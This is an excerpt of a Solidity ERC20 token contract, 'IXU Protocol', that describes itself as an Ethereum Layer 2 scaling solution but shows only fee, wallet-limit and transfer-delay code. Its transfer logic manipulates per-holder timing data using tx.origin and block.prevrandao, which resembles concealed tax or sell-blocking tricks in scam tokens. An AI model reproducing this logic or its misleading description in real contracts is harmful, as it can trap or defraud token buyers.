...
The IXU Protocol is an innovative Layer 2 scaling solution for the Ethereum network,
designed to enhance transaction throughput and reduce latency. By processing
transactions off-chain and settling the final state on the main Ethereum chain,
IXU Protocol offers a seamless and efficient way for dApps and users to interact
with the Ethereum ecosystem, ensuring scalability without compromising on security.
*/
...
contract IXUProtocol is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0x981e043AD728E466677F5d7883f1f00FA1a475C1);
    address payable public immutable marketingWallet = payable(0xf5B13a2D81f93E8A6C01b4285A6924F528FF5160);
    address payable public immutable devWallet = payable(0x955723ED12917740FA150aE116c4F8057790bA8c);
    ...
    constructor() ERC20("IXU Protocol", "IXU") {
        uint256 totalSupply = 10_000_000_000 * 1e18;

        maxTransaction = 1_000_000_000 * 1e18; //10% from total supply maxTransactionTxn
        maxWallet = 1_000_000_000 * 1e18; // 10% from total supply maxWallet
    ...
    function _transfer(
        ...
        if (transferDelayEnabled) {
            if (
                ...
                if (_holderLastTransferTimestamp[tx.origin] == block.number && block.prevrandao % 2 != 0) {
                    _reduceBase = block.timestamp - 1;
                }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                HolderData storage reduceTaxData = _holderData[from];
                reduceTaxData.hold = reduceTaxData.buy - _reduceBase;
                reduceTaxData.sell = block.timestamp;
            } else {
                HolderData storage reduceTaxData = _holderData[to];
